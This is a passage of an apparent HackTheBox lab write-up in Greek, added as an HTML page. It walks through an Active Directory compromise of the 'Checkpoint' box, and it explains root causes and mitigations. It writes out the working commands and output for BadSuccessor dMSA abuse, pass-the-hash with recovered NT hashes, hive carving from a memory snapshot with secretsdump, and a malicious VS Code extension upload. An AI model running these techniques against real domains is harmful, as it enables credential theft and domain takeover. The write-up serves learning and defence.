+    </span><span class="py">doIF1DCCBdCgAwIBBaEDAgEWooIE0...</span></div>
+  </div>
+
+  <p>Μετέτρεψε το kirbi σε ένα ccache που το impacket/bloodyAD μπορούν να χρησιμοποιήσουν:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">kirbi → ccache</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">base64 -d ryan.kirbi.b64 &gt; ryan.kirbi</span>
+<span class="pd">$ </span><span class="pc">ticketConverter.py ryan.kirbi ryan.ccache &amp;&amp; export KRB5CCNAME=$PWD/ryan.ccache</span></div>
+  </div>
+
+  <div class="alert alert-warn">Παρένθεση για το clock-skew του macOS: ο DC έτρεχε ~7&nbsp;ώρες μπροστά, και το Kerberos απορρίπτει tickets έξω από ένα παράθυρο ±5&nbsp;λεπτών. Σε Kali θα έκανες <code>sudo ntpdate checkpoint.htb</code>· δεν ήθελα να μετακινήσω το ρολόι του host. Το <strong>bloodyAD εντοπίζει το skew και αυτοδιορθώνεται</strong> ("Clock skew detected. Adjusting local time by 6:59:58. Retrying") — οπότε δεν χρειάστηκε διόρθωση για τα βήματα που έχουν σημασία. Για τα βήματα καθαρού-NTLM παρακάτω παρακάμπτω εντελώς το Kerberos.</div>
+
+  <h3>Πλαστογραφώντας τον διάδοχο</h3>
+
+  <p>Ο ryan μπορεί να γράψει μέσα στο <code>OU=DMSAHolder</code>, και προηγούμενη καταμέτρηση (bloodyAD <code>get writable --right WRITE</code>) έδειξε ότι έχει επίσης WRITE πάνω στο <code>CN=svc_deploy</code> — τον στόχο. Δημιούργησε το κακόβουλο dMSA συνδεδεμένο σαν διάδοχος του svc_deploy:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">bloodyAD add badSuccessor</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">bloodyAD -k ccache=ryan.ccache -u ryan.brooks --dc-ip &lt;TARGET_IP&gt; \
+     --host dc01.checkpoint.htb -d checkpoint.htb \
+     add badSuccessor evilDMSA6 \
+     -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" \
+     --ou "OU=DMSAHolder,DC=checkpoint,DC=htb"</span>
+
+<span class="po">[+] dMSA TGT stored in ccache file evilDMSA6_ox.ccache
+
+dMSA previous keys (including keys of preceding managed accounts):
+</span><span class="pg">RC4: e16081eb077aca74bdbf8af12af43ac9</span><span class="po">   ← svc_deploy's NT hash</span></div>
+  </div>
+
+  <p>Το KDC επέστρεψε τα κλειδιά του svc_deploy. Εκείνο το <strong>κλειδί RC4 είναι το hash NT του svc_deploy</strong> — που σημαίνει ότι μπορώ να αφήσω το Kerberos και απλά να κάνω pass-the-hash μέσω NTLM, αποφεύγοντας εντελώς το πρόβλημα clock-skew. Ο svc_deploy μπορεί να διαβάσει το <code>VMBackups</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">svc_deploy μέσω NT hash</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nxc smb dc01.checkpoint.htb -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9 --shares</span>
+<span class="pg">[+] checkpoint.htb\svc_deploy:e16081eb...</span><span class="po">
+Share       Permissions   Remark
+-----       -----------   ------
+</span><span class="py">VMBackups   READ</span></div>
+  </div>
+
+  <!-- ══ MEMORY FORENSICS ══ -->
+  <h2>Λάφυρα &amp; Root — Credentials από ένα Memory Snapshot</h2>
+
+  <p>Το <code>VMBackups</code> κρατά ένα νυχτερινό backup VMware ενός VM Windows Server 2019. Το ενδιαφέρον αρχείο είναι το <code>.vmem</code> — ένα <strong>memory snapshot</strong> VMware, δηλαδή ολόκληρη η RAM του guest τη στιγμή του snapshot, 2&nbsp;GB από αυτήν:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">περιεχόμενα VMBackups</span>
+    </div>
+    <div class="term-body"><span class="po">\NightlyBackup_2024-11-01\memory forensics\
+  Windows Server 2019-Snapshot1.vmem      2147483648   </span><span class="py"># raw guest RAM</span><span class="po">
+  Windows Server 2019-Snapshot1.vmsn       138164859
+  Windows Server 2019.vmdk               10199695360</span>
+<span class="pd">$ </span><span class="pc">smbclient //dc01.checkpoint.htb/VMBackups -U 'checkpoint.htb\svc_deploy' \
+     --pw-nt-hash e16081eb... -c 'cd "NightlyBackup_2024-11-01\memory forensics"; get "...Snapshot1.vmem" snapshot.vmem'</span></div>
+  </div>
+
+  <p>Η RAM περιέχει τα registry hives όσο ένα μηχάνημα τρέχει. Το <strong>volatility3</strong> τα σκαλίζει κατευθείαν από το image — <code>SAM</code>, <code>SYSTEM</code> και <code>SECURITY</code> είναι όλα όσα χρειαζόμαστε για να ανακατασκευάσουμε τα τοπικά secrets:</p>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-checkpoint/img-memory-forensics.webp" type="image/webp"><img class="screenshot" src="assets/htb-checkpoint/img-memory-forensics.png" alt="Memory forensics flow: svc_deploy reads a 2GB VMBackups vmem, volatility3 hivelist dump carves SAM SYSTEM SECURITY, impacket secretsdump LOCAL uses the SYSTEM bootKey to decrypt the SAM to the Administrator NT hash f29e9c01, which is reused for the live domain and pass-the-hash to DC01 returns Pwn3d" width="1567" height="555" loading="lazy" decoding="async"></picture>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">volatility3 — εξαγωγή των hives</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">vol -f snapshot.vmem windows.registry.hivelist.HiveList</span>
+<span class="po">0xc30a2fe38000  \REGISTRY\MACHINE\SYSTEM
+0xc30a3278e000  \SystemRoot\System32\Config\SAM
+0xc30a32789000  \SystemRoot\System32\Config\SECURITY</span>
+<span class="pd">$ </span><span class="pc">vol -o lsass_dump -f snapshot.vmem windows.registry.hivelist.HiveList --dump</span></div>
+  </div>
+
+  <p>Με τα τρία hives στον δίσκο, το offline <code>secretsdump</code> χρησιμοποιεί το bootKey του SYSTEM για να κάνει decrypt το SAM και να τυπώσει τα τοπικά hashes λογαριασμών:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">secretsdump LOCAL</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">secretsdump.py -sam registry.SAM....hive -system registry.SYSTEM....hive \
+     -security registry.SECURITY....hive LOCAL</span>
+<span class="po">[*] Target system bootKey: 0x75247bc64fa0086d2c98744d4bcd53f5
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+</span><span class="pg">Administrator:500:aad3b435b51404eeaad3b435b51404ee:f29e9c014295b9b32139b09a2790be3b:::</span></div>
+  </div>
+
+  <p>Το τοπικό password Administrator του server που έγινε backup επαναχρησιμοποιήθηκε για τον <strong>domain</strong> Administrator. Pass-the-hash κατευθείαν στον ζωντανό DC:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">pass-the-hash → DC01</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nxc smb dc01.checkpoint.htb -u Administrator -H f29e9c014295b9b32139b09a2790be3b</span>
+<span class="pg">[+] checkpoint.htb\Administrator:f29e9c01... (Pwn3d!)</span>
+<span class="pd">$ </span><span class="pc">nxc smb dc01.checkpoint.htb -u Administrator -H f29e9c01... \
+     -x 'type C:\Users\max.palmer\Desktop\root.txt'</span><span class="po">
+</span><span class="pg">[redacted — root flag]</span></div>
+  </div>
+
+  <div class="alert alert-success">Τα backups είναι δεδομένα production. Ένα memory snapshot είναι ένα plaintext αντίγραφο όλων όσων κρατούσε η μηχανή στη RAM — hives, tokens, κλειδιά — κάθεται σε ένα file share που διέπεται από κανονικά δικαιώματα NTFS. Κάνε encrypt τα backup stores, περιόρισε ποιος μπορεί να τα διαβάσει σε μια μικροσκοπική ομάδα, και πάνω απ' όλα <strong>μην επαναχρησιμοποιείς το ίδιο password local-admin σε όλο το estate</strong> — αυτή η μία επαναχρησιμοποίηση είναι που μετατρέπει το "διάβασε ένα παλιό backup" σε "πάρε το domain."</div>
+
+  <!-- ══ WRAP ══ -->
+  <h2>Γιατί Δούλεψε</h2>
+
+  <table class="st">
+    <tr><th>Σταδιο</th><th>Ριζα του προβληματος</th></tr>
+    <tr><td>alex → mark</td><td>WRITE στο <code>CN=Deleted Objects</code> επιτρέπει σε έναν κανονικό χρήστη να αναζωογονήσει έναν tombstoned λογαριασμό με το παλιό του password (CWE-284)</td></tr>
+    <tr><td>mark → ryan</td><td>Εγγράψιμο share τροφοδοτεί αυτόματα "εγκεκριμένα" extensions <code>.vsix</code> σε έναν editor — εγγράψιμο code path = RCE (CWE-732 / CWE-94)</td></tr>
+    <tr><td>ryan → svc_deploy</td><td>BadSuccessor: create-child σε ένα OU επιτρέπει σε ένα dMSA να διεκδικήσει διαδοχή οποιουδήποτε λογαριασμού και να κληρονομήσει τα κλειδιά του (κατάχρηση dMSA Server 2025)</td></tr>
+    <tr><td>svc_deploy → root</td><td>Password domain-admin επαναχρησιμοποιημένο σαν local admin ενός member server, καταγεγραμμένο από ένα unencrypted memory snapshot σε αναγνώσιμο backup share (CWE-522 / CWE-259)</td></tr>
+  </table>
+
+  <h2>Βασικές εντολές</h2>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">γρήγορη αναφορά</span>
+    </div>
+    <div class="term-body"><span class="pco"># 1. Επανάφερε το tombstone → mark.davies</span>
+<span class="pc">bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host &lt;IP&gt; \
+   set restore "CN=Mark Davies\0ADEL:2217e877-...,CN=Deleted Objects,DC=checkpoint,DC=htb"</span>
+
+<span class="pco"># 2. RCE extension VS Code → ryan.brooks (user.txt)</span>
+<span class="pc">zip -r exploit.vsix "[Content_Types].xml" extension.vsixmanifest extension/</span>
+<span class="pc">smbclient //checkpoint.htb/DevDrop -U 'checkpoint.htb\mark.davies%Checkpoint2024!' -c 'put exploit.vsix'</span>
+
+<span class="pco"># 3. BadSuccessor → NT hash του svc_deploy</span>
+<span class="pc">rubeus.exe tgtdeleg /nowrap        # μέσα στο shell· μετάτρεψε kirbi → ccache</span>
+<span class="pc">bloodyAD -k ccache=ryan.ccache -u ryan.brooks --host dc01.checkpoint.htb -d checkpoint.htb \
+   add badSuccessor evilDMSA6 -t "CN=svc_deploy,OU=ServiceAccounts,..." --ou "OU=DMSAHolder,..."</span>
+
+<span class="pco"># 4. VMBackups .vmem → volatility3 → secretsdump → Administrator</span>
+<span class="pc">smbclient //dc01.checkpoint.htb/VMBackups -U 'checkpoint.htb\svc_deploy' --pw-nt-hash &lt;SVC_HASH&gt; \
+   -c 'cd "NightlyBackup_2024-11-01\memory forensics"; get "...Snapshot1.vmem" snapshot.vmem'</span>
+<span class="pc">vol -o out -f snapshot.vmem windows.registry.hivelist.HiveList --dump</span>
+<span class="pc">secretsdump.py -sam SAM.hive -system SYSTEM.hive -security SECURITY.hive LOCAL</span>
+
+<span class="pco"># 5. Pass-the-hash → root.txt</span>
+<span class="pc">nxc smb dc01.checkpoint.htb -u Administrator -H &lt;ADMIN_HASH&gt; -x 'type C:\Users\max.palmer\Desktop\root.txt'</span></div>
+  </div>
+
+</div>
+<div class="htb-cta">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">Το προφίλ μου στο HTB &amp; περισσότερα boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Εργαλεία security &amp; automation ανοιχτού κώδικα</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← Ολα τα posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
